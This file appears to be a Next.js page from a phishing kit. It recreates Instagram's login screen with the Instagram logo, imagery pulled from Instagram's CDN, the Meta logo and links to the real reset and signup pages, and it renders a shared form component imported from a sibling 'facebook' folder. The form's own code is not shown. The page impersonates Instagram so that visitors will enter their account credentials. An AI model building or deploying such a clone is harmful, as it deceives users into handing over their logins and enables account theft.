import type { Metadata } from 'next'
import Image from 'next/image'
import Link from 'next/link'

import { FbLoginForm } from '../facebook/FbLoginForm'

export const metadata: Metadata = {
  title: 'Log in to Instagram',
  description: 'Log in to Instagram to share what you create, connect with friends, and explore.',
}

/** Hero collage chính thức (Stories) — https://static.cdninstagram.com */
const IG_HERO_COLLAGE_WEBP =
  'https://static.cdninstagram.com/rsrc.php/yJ/r/53X3pk-t2Gn.webp'

const TEXT_DARK = '#1c1e21'

const uiFont =
  'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI Historic", "Segoe UI", Roboto, Helvetica, Arial, sans-serif'

const IG_ACCENT = '#E4405F'

/** Logo camera Instagram kiểu gradient (cùng markup ý tưởng với trang business login). */
function InstagramGradientGlyph({
  className,
  gradientId = 'igLoginGradA',
}: {
  className?: string
  gradientId?: string
}) {
  return (
    <svg
      className={className}
      fill={`url(#${gradientId})`}
      viewBox="0 0 48 48"
      width="1em"
      height="1em"
      aria-hidden
      role="img"
    >
      <defs>
        <linearGradient id={gradientId} x1="0%" y1="100%" x2="100%" y2="0%">
          <stop offset="0%" stopColor="#FFDD55" />
          <stop offset="22%" stopColor="#FF543E" />
          <stop offset="48%" stopColor="#C837AB" />
          <stop offset="72%" stopColor="#5851DB" />
          <stop offset="100%" stopColor="#405DE6" />
        </linearGradient>
      </defs>
      <path d="M24 5.1c6.1 0 6.9 0 9.3.1 2.2.1 3.5.5 4.3.8 1.1.4 1.8.9 2.6 1.7.8.8 1.3 1.6 1.7 2.6.3.8.7 2 .8 4.3.1 2.4.1 3.2.1 9.3s0 6.9-.1 9.3c-.1 2.2-.5 3.5-.8 4.3-.4 1.1-.9 1.8-1.7 2.6-.8.8-1.6 1.3-2.6 1.7-.8.3-2 .7-4.3.8-2.4.1-3.2.1-9.3.1s-6.9 0-9.3-.1c-2.2-.1-3.5-.5-4.3-.8-1.1-.4-1.8-.9-2.6-1.7-.8-.8-1.3-1.6-1.7-2.6-.3-.8-.7-2-.8-4.3-.1-2.4-.1-3.2-.1-9.3s0-6.9.1-9.3c.1-2.2.5-3.5.8-4.3.4-.9.9-1.7 1.7-2.5.8-.8 1.6-1.3 2.6-1.7.8-.3 2-.7 4.3-.8 2.4-.1 3.2-.2 9.3-.2M24 1c-6.2 0-7 0-9.5.1-2.4.1-4.1.5-5.6 1.1-1.5.6-2.8 1.4-4 2.7-1.3 1.2-2.1 2.5-2.7 4-.6 1.5-1 3.1-1.1 5.6C1 17 1 17.8 1 24s0 7 .1 9.5c.1 2.4.5 4.1 1.1 5.6.6 1.5 1.4 2.8 2.7 4.1 1.3 1.3 2.6 2.1 4.1 2.7 1.5.6 3.1 1 5.6 1.1H24c6.2 0 7 0 9.5-.1 2.4-.1 4.1-.5 5.6-1.1 1.5-.6 2.8-1.4 4.1-2.7 1.3-1.3 2.1-2.6 2.7-4.1.6-1.5 1-3.1 1.1-5.6V24c0-6.2 0-7-.1-9.5-.1-2.4-.5-4.1-1.1-5.6-.6-1.5-1.4-2.8-2.7-4.1-1.3-1.3-2.6-2.1-4.1-2.7-1.5-.6-3.1-1-5.6-1.1H24zm0 11.2c-6.5 0-11.8 5.3-11.8 11.8S17.5 35.8 24 35.8 35.8 30.5 35.8 24 30.5 12.2 24 12.2zm0 19.5c-4.2 0-7.7-3.4-7.7-7.7s3.4-7.7 7.7-7.7 7.7 3.4 7.7 7.7-3.5 7.7-7.7 7.7zM36.3 9c-1.5 0-2.8 1.2-2.8 2.8s1.2 2.8 2.8 2.8c1.5 0 2.8-1.2 2.8-2.8S37.8 9 36.3 9z" />
    </svg>
  )
}

export default function InstagramLoginPage() {
  return (
    <div
      className="min-h-[100dvh] bg-white antialiased [-webkit-font-smoothing:antialiased]"
      style={{ fontFamily: uiFont, color: TEXT_DARK }}
    >
      <div className="mx-auto flex min-h-[100dvh] max-w-[1920px] flex-col lg:min-h-screen lg:flex-row">
        <section className="hidden min-h-screen w-full flex-col bg-white lg:flex lg:flex-[0_0_58%] lg:justify-between lg:px-[clamp(2.5rem,4vw,4.25rem)] lg:pb-[clamp(1.75rem,3vh,3rem)] lg:pt-[clamp(2rem,3.5vw,3rem)] xl:pl-[4.75rem] xl:pr-14">
          <header className="shrink-0">
            <span className="sr-only">Instagram</span>
            <span
              aria-hidden="true"
              className="inline-block translate-y-px leading-none [--ig-g-size:clamp(2.5rem,5.25vw,3.125rem)] [font-size:var(--ig-g-size)]"
            >
              <InstagramGradientGlyph gradientId="igLoginGradDesk" className="block size-[1em]" />
            </span>
          </header>

          <div className="relative flex min-h-0 w-full flex-1 flex-col justify-center pb-6 pt-4 lg:my-0 lg:px-0 lg:py-4">
            <div className="relative mx-auto h-[min(74vh,880px)] w-full max-w-[min(800px,calc(100%-1rem))] shrink-0 xl:max-w-[min(860px,95%)]">
              <Image
                src={IG_HERO_COLLAGE_WEBP}
                alt=""
                fill
                sizes="(max-width: 1024px) 92vw, min(860px, 60vw)"
                className="object-contain object-center"
                priority
              />
            </div>
          </div>

          <footer className="relative z-[1] shrink-0 pb-2 pt-8 lg:pb-2 lg:pt-10">
            <p
              className="text-left font-bold tracking-[-0.04em] text-[#1c1e21] lg:whitespace-normal"
              style={{
                fontSize: 'clamp(1.9375rem, 1vw + 1.45rem, 2.9375rem)',
                lineHeight: 1.1,
              }}
            >
              See everyday moments from your{' '}
              <span className="inline-block bg-clip-text bg-[linear-gradient(217deg,#FFDD55_0%,#FF543E_24%,#C837AB_48%,#5851DB_72%,#405DE6_100%)] text-transparent">
                close friends
              </span>
              <span className="text-[#1c1e21]">.</span>
            </p>
          </footer>
        </section>

        <div className="hidden w-px shrink-0 self-stretch bg-[#dadde1] lg:block" aria-hidden />

        <aside className="flex w-full flex-1 flex-col bg-white lg:min-h-screen lg:max-w-none lg:min-w-0 lg:flex-[0_0_42%]">
          <div className="mx-auto flex min-h-[100dvh] w-full max-w-[396px] flex-col justify-between px-6 pb-10 pt-[42px] sm:px-8 lg:max-h-none lg:min-h-screen lg:justify-between lg:px-12 lg:pb-12 lg:pt-14 xl:px-14">
            <div className="flex flex-col lg:flex-1 lg:justify-center lg:pt-4">
              <div className="mb-11 flex justify-center lg:hidden">
                <InstagramGradientGlyph gradientId="igLoginGradMob" className="block size-[60px]" aria-hidden />
              </div>

              <h1
                className="hidden text-center font-bold tracking-[-0.015em] text-[#1c1e21] lg:block"
                style={{
                  fontSize: '1.25rem',
                  lineHeight: 'calc(1.25 * 1.3)',
                }}
              >
                Log in to Instagram
              </h1>

              <FbLoginForm variant="instagram" />

              <nav className="mt-3 text-center" aria-label="Account help">
                <Link
                  href="https://www.instagram.com/accounts/password/reset/"
                  className="inline-block text-[17px] font-normal leading-snug hover:underline max-lg:text-[#1c1e21] lg:text-[15px]"
                  style={{ color: IG_ACCENT }}
                >
                  Forgotten password?
                </Link>
              </nav>
            </div>

            <div className="flex flex-col gap-8 pb-2 pt-6 lg:mt-8 lg:flex lg:shrink-0 lg:gap-0 lg:pb-12 lg:pt-0">
              <Link
                href="https://www.instagram.com/accounts/emailsignup/"
                target="_blank"
                rel="noopener noreferrer"
                className="flex h-11 w-full shrink-0 items-center justify-center rounded-[10px] border border-solid border-[#E4405F] bg-white text-[17px] font-semibold leading-tight text-[#E4405F] transition-colors hover:bg-[#F5F6F7] lg:rounded-md lg:border-0 lg:bg-[#E4405F] lg:text-white lg:hover:bg-[#d73363] lg:active:bg-[#c42d57]"
              >
                Create new account
              </Link>

              <div className="flex justify-center lg:mt-10">
                <Image
                  src="/images/meta/logo-meta.svg"
                  alt="Meta"
                  width={132}
                  height={26}
                  className="h-[26px] w-auto max-w-[min(100%,148px)] object-contain object-center opacity-[0.98]"
                />
              </div>
            </div>
          </div>
        </aside>
      </div>
    </div>
  )
}
